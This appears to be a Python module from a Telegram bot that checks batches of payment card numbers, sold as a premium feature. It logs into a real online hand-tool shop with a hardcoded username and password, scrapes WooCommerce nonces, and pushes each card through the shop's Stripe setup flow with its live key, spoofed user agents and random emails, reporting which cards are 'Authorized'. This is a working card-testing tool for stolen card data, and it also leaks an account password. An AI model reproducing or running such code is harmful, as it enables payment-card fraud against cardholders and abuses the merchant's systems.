import time
import re
import aiohttp
import asyncio
import requests
import random
import string
import traceback
from EQUROBOT import app
from EQUROBOT.core.mongo import has_premium_access
from pyrogram import Client, filters
from fake_useragent import UserAgent
from requests.exceptions import RequestException, Timeout
from collections import defaultdict
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from config import OWNER_ID

user_request_times = defaultdict(list)



def random_string(length=12):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))

async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    bin_info = await response.json()
                    return (
                        bin_info.get("brand", "N/A"),
                        bin_info.get("type", "N/A"),
                        bin_info.get("level", "N/A"),
                        bin_info.get("bank", "N/A"),
                        bin_info.get("country_name", "N/A"),
                        bin_info.get("country_flag", ""),
                    )
                else:
                    return "Error fetching BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"
        except aiohttp.ClientError:
            return "Error parsing BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"


def new_session():
    session = requests.Session()
    retry = Retry(
        total=3,
        backoff_factor=0.3,
        status_forcelist=[500, 502, 503, 504],
        allowed_methods=["GET", "POST"],
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("https://", adapter)
    return session

async def check_card(card_info, message):
    card = card_info.split("|")
    if len(card) != 4 or not all(card):
        return "Invalid card details. Please use the format: card_number|mm|yy|cvv"

    cc, mm, yy, cvv = card
    start_time = time.time()

    session = new_session()

    user_agent = UserAgent().random
    headers = {
        "User-Agent": user_agent,
        "Pragma": "no-cache",
        "Accept": "*/*",
    }

    email = random_string() + "@gmail.com"

    try:
        response = session.get(
            "https://handtoolessentials.com/my-account/payment-methods/",
            headers=headers,
            timeout=10
        )
        response.raise_for_status()

        try:
            n_start = response.text.index('woocommerce-login-nonce" value="') + len(
                'woocommerce-login-nonce" value="'
            )
            n_end = response.text.index('"', n_start)
            nonce = response.text[n_start:n_end]
        except ValueError:
            return "Failed to extract login nonce, retrying with a fresh session..."

    except (requests.RequestException, ValueError) as e:
        return f"Request failed: {str(e)}"

    login_data = {
        "username": "fernando551601",
        "password": "RAJNISHAYUSHI*1+",
        "woocommerce-login-nonce": nonce,
        "_wp_http_referer": "/my-account/add-payment-method",
        "login": "Log in",
    }

    try:
        response = session.post(
            "https://handtoolessentials.com/my-account/payment-methods/",
            headers=headers,
            data=login_data,
            timeout=10
        )
        response.raise_for_status()
    except requests.RequestException as e:
        return f"Login failed: {str(e)}, retrying with a fresh session..."

    try:
        m_start = response.text.index('add_card_nonce":"') + len('add_card_nonce":"')
        m_end = response.text.index('","', m_start)
        add_card_nonce = response.text[m_start:m_end]
    except ValueError:
        return "Failed to extract add card nonce."

    stripe_data = {
        "type": "card",
        "billing_details[name]": "",
        "billing_details[email]": email,
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "guid": random_string(32),
        "muid": random_string(32),
        "sid": random_string(32),
        "payment_user_agent": "stripe.js/2F0f84b1fa113B; stripe-js-v3/2F0f84b1fa113B; split-card-element",
        "referrer": "https://handtoolessentials.com",
        "time_on_page": str(random.randint(10000, 50000)),
        "key": "pk_live_5ZSl1RXFaQ9bCbELMfLZxCsG",
    }

    try:
        stripe_response = session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=stripe_data,
            timeout=10
        )
        stripe_response.raise_for_status()
        stripe_json = stripe_response.json()
    except (RequestException, ValueError) as e:
        return f"Stripe payment method creation failed: {str(e)}"

    if "id" not in stripe_json:
        return f"Failed to create payment method. Reason: {stripe_json.get('error', {}).get('message', 'Unknown error')}"

    stripe_id = stripe_json["id"]

    confirm_data = {
        "wc-ajax": "wc_stripe_create_setup_intent",
        "stripe_source_id": stripe_id,
        "nonce": add_card_nonce,
    }

    try:
        confirm_response = session.post(
            "https://handtoolessentials.com/?wc-ajax=wc_stripe_create_setup_intent",
            headers=headers,
            data=confirm_data,
        )
        confirm_response.raise_for_status()
        confirm_json = confirm_response.json()

        msg = confirm_json.get("status", "")
        status = "Unknown"
        resp = "No valid response received."

        if "error" in confirm_json:
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            resp2 = confirm_json["error"]["message"]
            resp = "Your card was declined."

        elif confirm_json.get("status") == "success":
            status = "𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 ✅"
            resp = "Approved"

        elif confirm_json.get("status") == "requires_action":
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            resp = "Requires OTP."

        brand, card_type, level, bank, country, flag = await get_bin_info(cc[:6])

        execution_time = time.time() - start_time
        final_response = (
            f"{status}\n\n"
            f"𝗖𝗮𝗿𝗱 ⇾ `{cc}|{mm}|{yy}|{cvv}`\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {resp}\n\n"
            f"𝗜𝗻𝗳𝗼 ⇾ {brand} - {card_type} - {level}\n"
            f"𝗜𝘀𝘀𝘂𝗲𝗿 ⇾ {bank} 🏛\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country} {flag}\n\n"
            f"𝗧𝗶𝗺𝗲 ⇾ {execution_time:.2f} **Seconds**\n"
            f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ [{message.from_user.first_name}](tg://user?id={message.from_user.id})"
        )
        return final_response

    except (RequestException, ValueError) as e:
        return "An error occurred during payment confirmation."

    except Exception as e:
        error_message = f"An error occurred: {str(e)}\n"
        error_type = f"Error Type: {type(e).__name__}\n"
        traceback_details = traceback.format_exc()
        full_error = error_message + error_type + traceback_details
        return "An internal error occurred, please try again later."

    finally:
        session.close()


card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")

@app.on_message(filters.command("sa", prefixes=[".", "/", "!"]))
async def handle_check_card(client, message):
    user_id = message.from_user.id

    if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
        return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")

    
    if not allowed:
        await message.reply(
            f"🚫 **Anti-Spam** Detected! Please try again after {remaining_time} seconds."
        )
        return

    try:
        card_info = message.text.split(maxsplit=1)[1].strip()
    except IndexError:
        await message.reply(
            "Please provide the card details in the format: `card_number|mm|yy|cvv`"
        )
        return

    if not card_pattern.fullmatch(card_info):
        await message.reply(
            "Please provide the card details in the format: `card_number|mm|yy|cvv`."
        )
        return

    processing_msg = await message.reply("Processing your request...")

    try:
        response = await check_card(card_info, message)
        await processing_msg.edit_text(response)
    except Exception as e:
        await processing_msg.edit_text(f"An error occurred: {str(e)}")


@app.on_message(filters.command("msa", prefixes=[".", "/", "!"]))
async def handle_mass_check_card(client, message):
    user_id = message.from_user.id

    if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
        return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")


    if not allowed:
        await message.reply(
            f"🚫 **Anti-Spam** Detected! Please try again after {remaining_time} seconds."
        )
        return

    try:
        cards_info = message.text.split(maxsplit=1)[1].strip().split("\n")
    except IndexError:
        await message.reply(
            "Please provide multiple card details, each on a new line in the format: `card_number|mm|yy|cvv`."
        )
        return

    if user_id in ADMIN_IDS:
        card_limit = 25
    else:
        card_limit = 5

    if len(cards_info) > card_limit:
        await message.reply(
            f"You can check up to {card_limit} cards at a time. Please reduce the number of cards."
        )
        return

    for card_info in cards_info:
        if not card_pattern.fullmatch(card_info.strip()):
            await message.reply(
                f"Please ensure all cards are in the format: `card_number|mm|yy|cvv`."
            )
            return

    results = []
    start_time = time.time()
    processing_msg = await message.reply("Processing your mass auth request...")

    try:
        response_message = "𝗠𝗮𝘀𝘀 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵\n\n"

        for card_info in cards_info:
            card_info = card_info.strip()
            response = await check_card(card_info, message)

            cc, mm, yy, cvv = card_info.split("|")
            card_details = f"{cc}|{mm}|{yy}|{cvv}"

            if "𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝" in response:
                status = "**Authorized** ✅"
                resp = "Approved"
            elif "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝" in response:
                status = "**Declined** ❌"
                resp = "Your card was declined."
            else:
                status = "**Declined** ❌"
                resp = "Card requires OTP."

            response_message += (
                f"𝗖𝗮𝗿𝗱: `{card_details}`\n"
                f"𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}\n\n"
            )

            await asyncio.sleep(2)

        elapsed_time = time.time() - start_time
        response_message += f"**Time**: {elapsed_time:.2f}𝐬\n"
        response_message += f"**Checked By**: [{message.from_user.first_name}](tg://user?id={message.from_user.id})"

        await processing_msg.edit_text(response_message)

    except Exception as e:
        await processing_msg.edit_text(f"An error occurred: {str(e)}")
